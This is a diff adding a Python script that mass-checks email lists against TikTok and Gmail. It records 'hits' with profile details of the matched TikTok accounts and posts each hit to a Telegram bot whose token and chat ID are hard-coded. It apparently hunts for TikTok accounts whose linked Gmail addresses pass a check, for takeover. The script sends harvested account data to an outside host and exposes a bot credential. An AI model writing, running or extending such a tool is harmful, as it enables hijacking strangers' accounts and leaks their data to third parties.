@@ -1,0 +1,165 @@
+import asyncio, aiohttp, checktik, os, checkgm, PKK, email2user, rest, kiloa, requests, ms4, time
+from colorama import init, Fore, Back, Style
+from asyncio import Semaphore
+from rich.panel import Panel
+from rich.console import Console
+console = Console()
+
+# ============================================
+# تكوين البوت - تم تثبيته داخلياً
+# ============================================
+BOT_TOKEN = "8607873288:AAFokRG9yl-gHfbpowL4h6LDUkqZL5OpArE"
+CHAT_ID = "5952132218"
+# ============================================
+
+used_file = "data/used.txt"
+filename = "data/EmailOnTik2026M3.txt"
+filename = "data/MustafaList.txt"
+init(autoreset=True)
+Z = Fore.RED
+F = Fore.GREEN
+X = Fore.YELLOW
+blue = Fore.BLUE
+magenta = Fore.MAGENTA
+cyan = Fore.CYAN
+white = Fore.WHITE
+
+goodtik, badtik, hit, badgm, nontik, nongm = 0, 0, 0, 0, 0, 0
+
+counter_lock = asyncio.Lock()
+
+async def logo():
+    print(f" {cyan}[ {F}✔ Hit:{hit} {cyan}| {X}★ GoodTik:{goodtik} {cyan}| {Z}✖ BadTik:{badtik} {cyan}| {magenta}⚠ BadGm:{badgm} {cyan}]", end="\r", flush=True)
+    
+
+async def MustafaDev(email, session, semaphore):
+    async with semaphore:
+        try:
+            global goodtik, badtik, hit, badgm, nontik, nongm
+            result = await checktik.checktiktok(email, session)
+            
+            if result is True:
+                async with counter_lock:
+                    goodtik += 1
+                    await logo()
+                
+                chg = await checkgm.checkgmail(email, session)
+                if chg is True:
+                    async with counter_lock:
+                        hit += 1
+                        await logo()
+                    
+                    open("data/Hits.txt","a").write(email+"@gmail.com\n")
+                    em2us = email2user.email2user(email)
+                    if em2us is not None:
+                        open("data/HitsEmToUser.txt","a").write(em2us + "\n")
+                        info = ms4.InfoTik.TikTok_Info(em2us)
+                        tlg = f"""
+Hit TiK ToK ✓ : {hit}
+BY : @D_B_HH  CH :  @k_1_cc
+    UserName:{em2us}
+    email : {email}@gmail.com
+------------------------
+name: {info.get('name', '')}
+followers: {info.get('followers', '')}
+following: {info.get('following', '')}
+like: {info.get('like', '')}
+video: {info.get('video', '')}
+country: {info.get('country', '')} [{info.get('flag', '')}]
+date: {info.get('Date', '')}
+bio: {info.get('bio', '')}
+link: http://tiktok.com/@{em2us}
+------------------------
+BY : @D_B_HH  CH :  @k_1_cc
+"""
+                        open("data/GoodResult.txt", "a").write(tlg)
+                        print("\n")
+                        console.print(Panel(tlg))
+                        print("\n")
+                        try:
+                            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={tlg}')
+                        except:
+                            pass
+                    elif em2us is None:
+                        rst = rest.Rest(email)
+                        info = ms4.InfoTik.TikTok_Info(email)
+                        tlg = f"""
+Hit TiK ToK ✓ : {hit}
+BY : @D_B_HH  CH :  @k_1_cc
+    rest:{rst}
+    email : {email}@gmail.com
+------------------------
+name: {info.get('name', '')}
+followers: {info.get('followers', '')}
+following: {info.get('following', '')}
+like: {info.get('like', '')}
+video: {info.get('video', '')}
+country: {info.get('country', '')} [{info.get('flag', '')}]
+date: {info.get('Date', '')}
+bio: {info.get('bio', '')}
+link: http://tiktok.com/@{email}
+------------------------
+BY : @D_B_HH  CH :  @k_1_cc
+"""
+                        open("data/BadResult.txt", "a").write(tlg)
+                        console.print(Panel(tlg))
+                        try:
+                            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={tlg}')
+                        except:
+                            pass
+                    open(used_file, "a", encoding="utf-8").write(email + "\n")
+                elif chg is False:
+                    async with counter_lock:
+                        badgm += 1
+                        await logo()
+            elif result is False:
+                async with counter_lock:
+                    badtik += 1
+                    await logo()
+                open(used_file, "a", encoding="utf-8").write(email + "\n")
+        except:
+            pass
+
+async def clean_list():
+    if not os.path.exists(used_file):
+        return
+    used_emails = set()
+    with open(used_file, "r", encoding="utf-8") as f:
+        used_emails = set(line.strip() for line in f if line.strip())
+    if os.path.exists(filename):
+        with open(filename, "r", encoding="utf-8") as f:
+            lines = f.readlines()
+        new_lines = []
+        for line in lines:
+            email = line.strip()
+            if email and email not in used_emails:
+                new_lines.append(line)
+        with open(filename, "w", encoding="utf-8") as f:
+            f.writelines(new_lines)
+
+async def CheckList():
+    await clean_list()
+    with open(filename, "r", encoding="utf-8") as f:
+        emails = [line.strip() for line in f if line.strip()]
+        print(f"{cyan}[ {X}Before:{len(emails)} {cyan}| {F}After:{len(set(emails))} {cyan}| {magenta}Removed:{len(emails) - len(set(emails))} {cyan}]", end="\n")
+        time.sleep(3)
+        emails = list(set(emails))
+        os.system("clear")
+    
+    semaphore = Semaphore(20)
+    connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)
+    
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        for email in emails:
+            task = asyncio.create_task(MustafaDev(email, session, semaphore))
+            tasks.append(task)
+            
+            if len(tasks) >= 20:
+                await asyncio.gather(*tasks)
+                tasks = []
+        
+        if tasks:
+            await asyncio.gather(*tasks)
+
+asyncio.run(CheckList())
